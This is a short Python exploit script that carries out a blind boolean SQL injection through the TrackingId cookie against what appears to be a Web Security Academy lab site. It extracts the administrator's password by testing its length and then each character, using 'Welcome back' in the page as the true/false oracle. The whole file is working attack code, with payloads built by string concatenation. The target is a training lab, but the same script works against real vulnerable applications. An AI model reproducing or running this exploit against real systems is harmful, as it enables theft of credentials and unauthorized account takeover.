import requests

target_url = "https://0a6a000c04e605a781879d8a0090005d.web-security-academy.net/" # URL

cookies = {"TrackingId":"AgLnIrEJvfFAf7Wu", "session":"7DNotxTx2PXo8BxRMBqtDIlqIzsBMZoW"} # Your Cookie

symbols = "1234567890qwertyuiopasdfghjklzxcvbnm"

def valid_injection(text):
    if "Welcome back" in text: return True
    return False

length = 0

print("Indetifying password length for administrator")

while True:
    
    payload = "' AND (SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password) = " + str(length) + ") = '1' --"
    cookies["TrackingId"] = cookies["TrackingId"] + payload
    
    r = requests.get(target_url, cookies=cookies)
    
    if valid_injection(r.text):
        print("[+] Password length for administrator =", length)
        cookies["TrackingId"] = cookies["TrackingId"].replace(payload,"")
        break
    
    length = length + 1
    cookies["TrackingId"] = cookies["TrackingId"].replace(payload,"")
    

print("----------")

password = ""


for i in range(0, length):
    for s in symbols:
        
        payload = "' AND (SELECT SUBSTRING(password," + str(i + 1) + ",1) FROM users WHERE username='administrator') = '" + s + "' --"
        cookies["TrackingId"] = cookies["TrackingId"] + payload
        
        r = requests.get(target_url, cookies=cookies)
        
        if valid_injection(r.text):
            password = password + s
            cookies["TrackingId"] = cookies["TrackingId"].replace(payload,"")
            break
        
        cookies["TrackingId"] = cookies["TrackingId"].replace(payload,"")

print("[+] Password = " + password)
print("Good luck!")
